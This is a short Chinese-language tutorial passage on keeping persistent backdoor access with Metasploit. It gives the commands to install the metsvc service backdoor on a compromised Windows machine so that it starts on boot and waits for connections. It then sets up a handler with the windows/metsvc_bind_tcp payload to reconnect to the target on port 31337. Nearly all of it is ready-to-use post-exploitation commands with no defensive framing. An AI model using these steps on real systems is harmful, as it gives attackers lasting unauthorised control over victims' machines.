2、MSF权限维持后门

2.1 Metsvc服务维持后门

1.启动服务维持后门

    通过服务(metsvc)启动的方式，在目标机器启动后自启动一个服务，等待连接。

run metsvc -A

2.连接木马服务后门

use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set RHOST 192.168.207.131
set LPORT 31337
exploit
